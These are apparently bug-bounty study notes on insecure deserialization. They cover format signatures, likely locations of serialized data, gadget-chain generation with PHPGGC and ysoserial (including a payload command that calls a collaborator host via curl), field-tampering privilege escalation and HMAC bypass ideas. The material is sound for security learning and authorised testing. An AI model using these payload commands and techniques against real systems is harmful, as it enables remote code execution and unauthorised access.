# Ch14: Insecure Deserialization

Source: Chapter 14. Serialization = objects → storable format (PHP `serialize`, Python pickle, Java `ObjectInputStream`, .NET BinaryFormatter, Ruby Marshal). Deserialization = bytes → live objects. Danger: crafted input instantiates attacker-chosen objects and runs their magic methods (`__wakeup`, `__destruct`, `readObject`, `pickle __reduce__`) → gadget chains → RCE.

## Hunting

- **Find serialized blobs**: `O:4:"User":2:{…}` (PHP), base64 blobs that decode to `rO0…` (Java serialization magic), `K\x80\x04…` / `gASV…` (pickle), `AAEAAAD…` (.NET), `BAhb…` (Ruby Marshal).
- **Locations**: cookies (`session=`, `rememberme=`), hidden form fields, JWT-like tokens, viewstate (`__VIEWSTATE`), API bodies, queue messages.
- **Confirm**: flip a field → watch behavior change; corrupt the blob → deserialization error leaks class names/stack trace.

## Exploitation path

1. Identify the format & language from the blob signature.
2. Map the classes available (source code review if obtainable — `.git` leak, open-source components, dependency list).
3. Generate a **gadget chain** payload, don't hand-craft:
   - PHP: **PHPGGC** (`phpggc Laravel/RCE1 system id -b`)
   - Java: **ysoserial** (`java -jar ysoserial.jar CommonsCollections6 "curl http://COLLAB"`)
   - .NET: **ysoserial.net**
   - Python pickle: hand-rolled `__reduce__` → `os.system`/`subprocess` — arbitrary code by design.
4. Deliver via the input; use OOB (Collaborator) to confirm when blind.

## Escalation & alternatives

- No gadget chain reachable? Still exploitable: **object property injection** — deserialize a legit object but overwrite fields (`is_admin:true`, `price:0`), or **data tampering** in signed-but-not-encrypted blobs.
- Escalation ceiling: gadget chain → RCE → shell; or deserialize→SSRF/file-write primitive.
- Mitigation bypass: integrity checks (HMAC) — look for key leaks, weak secrets, or unsigned sibling endpoints.

## First-bug checklist

Spot serialized input → identify format → tamper fields (priv escalation w/o code exec) → if gadgetable: PHPGGC/ysoserial + OOB confirm → escalate to `id`/`whoami` RCE on test scope → report with blob sample + gadget used.
